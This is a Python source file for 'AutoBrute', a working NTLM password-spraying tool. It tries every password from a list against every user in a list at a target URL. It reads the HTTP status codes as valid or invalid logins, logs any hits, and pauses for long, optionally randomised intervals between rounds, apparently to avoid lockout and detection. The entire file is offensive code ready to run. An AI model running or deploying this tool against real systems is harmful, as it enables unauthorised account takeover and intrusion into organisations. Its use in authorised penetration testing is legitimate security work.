#! /usr/bin/env python3

import requests
import difflib
import random
import sys
import os
import time
from requests_ntlm2 import HttpNtlmAuth
from optparse import OptionParser
from utils import messages
from pathlib import Path
from datetime import datetime
from datetime import timedelta

def sendrequest(url, username, password, domain, log):
    auth=HttpNtlmAuth("{}\\{}".format(domain, username), password)
    resp = requests.get(url, auth=auth)
    return resp

def processresponse(resp):
    isFound = False
    if resp.status_code == 200:
        msg = "VALID"
        isFound = True
    elif resp.status_code == 403 or resp.status_code == 401:
        msg = "INVALID"
    elif resp.status_code == 500:
        msg = "VALID (DISABLED?)"
        isFound = True
    elif resp.status_code == 404:
        msg = "VALID (MAYBE?)"
        isFound = True
    else:
        msg = "Unknown status code. You shouldn't be here." 

    return isFound, msg
   
def main():
    log = messages.message()
    usage = "Usage: %prog [options]"
    parser = OptionParser(usage=usage)
    parser.add_option("-t", "--targeturl", dest="targeturl", help="This URL (with complete URI) to the target site requesting authentication.")
    parser.add_option("-u", "--userfile", dest="userfile", help="Required. A list of users to use for authentication.")
    parser.add_option("-p", "--passfile", dest="passfile", help="Required. A list of passwords to use for authentication attempts.")
    parser.add_option("-v", "--verbose", action="store_true", default=False, help="Verbose output. Show each individual test.")
    parser.add_option("-d", "--domain", help="NTLM domain. Required if using NTLM authentication.")
    parser.add_option("-o", "--outputdir", help="Output directory. Path where brute force attempts are stored.")
    parser.add_option("--minwait", dest="minwait", default="3600", help="Minimum amount of time to wait between attempts (in seconds).")
    parser.add_option("--maxwait", dest="maxwait", default="-1", help="Maximum amount of time to wait between attempts (in seconds). If this is specified, then a random wait between min and max will be chosen.")
    (options, args) = parser.parse_args()

    # Error parsing
    #
    errors = []
    errorfound = False
    if options.userfile is None:
        errors.append("RTFMException. -u is Required.")
        errorfound = True
    else:
        p = Path(options.userfile)
        if p.exists() == False:
            errors.append("Userfile does not exist. Double check path.")
            errorfound = True

    if options.passfile is None:
        errors.append("RTFMException. -p is Required.")
        errorfound = True
    else:
        p = Path(options.passfile)
        if p.exists() == False:
            errors.append("Passfile does not exist. Double check path.")
            errorfound = True

    if options.targeturl is None:
        errors.append("RTFMException. -t is Required.")
        errorfound = True

    if options.domain is None:
        errors.append("RTFMException. -d is Required.")
        errorfound = True

    if options.outputdir is None:
        errors.append("RTFMException. -o is Required.")
        errorfound = True
    else:
        p = Path(options.outputdir)
        if p.exists() == False:
            os.makedirs(options.outputdir)

    if not options.maxwait == "-1" and int(options.maxwait) <= int(options.minwait):
        errors.append("Max wait time (seconds) must be greater than min wait time (seconds). e.g. --minwait 3600 --maxwait 7200")
        errorfound = True
        
    if errorfound:
        for msg in errors:
            log.error(msg, False)
        sys.exit(1)


    ## Main block
    #
    opener = "AutoBrute Start Time: {}".format(datetime.now())
    log.ok(opener)
    userfile = open(options.userfile, 'r').readlines() 
    passfile = open(options.passfile , 'r').readlines() 
    path_completed = options.outputdir + "/completed_passwords.txt"
    master_list = []
    session_completed = None

    if os.path.exists(path_completed):
        session_completed = open(path_completed, 'r').readlines()
        completed_pwds = open(path_completed, 'a')
    else:
        # First run 
        completed_pwds = open(path_completed, 'w')
        master_list = passfile

    if session_completed is not None:
        log.warn("Session file discovered. Resuming from last entry.")
        diffs = difflib.ndiff(passfile, session_completed)
        for i in diffs:
            if '- ' in i[:2]:
                master_list.append(i.lstrip('- ').rstrip('\n'))

    for pwd in master_list:
        pwd = pwd.strip('\n')
        outfile = open(options.outputdir + "/" + pwd + ".txt", 'w')
        masterFound = False

        for user in userfile:
            user = user.strip('\n')
            resp = sendrequest(options.targeturl, user, pwd, options.domain, log)
            isFound, msg = processresponse(resp)
            logoutput = "{}: {}\\{}: {}".format(msg, options.domain, user, pwd)

            if isFound:
                log.success(logoutput)
                masterFound = True
            else:
                if options.verbose:
                    log.error(logoutput, False)

            outfile.write(logoutput + '\n')
            outfile.flush()

        if masterFound == False:
            output = "No valid creds for {}".format(pwd)
            log.error(output, False)

        if not options.maxwait == '-1':
            # Get random wait time and sleep. Set waittime var
            waittime = random.randint(int(options.minwait), int(options.maxwait)) 
        else:
            waittime = int(options.minwait)

        completed_pwds.write(pwd + '\n')
        completed_pwds.flush()

        if pwd != master_list[-1]:
            nextrun = datetime.now() + timedelta(seconds=int(waittime))
            log.ok("Waiting {} seconds. Next run time: {}".format(waittime, nextrun))
            time.sleep(waittime)

    closer = "AutoBrute Finished Time: {}".format(datetime.now())
    log.ok(closer)

if __name__ == '__main__':
    main()
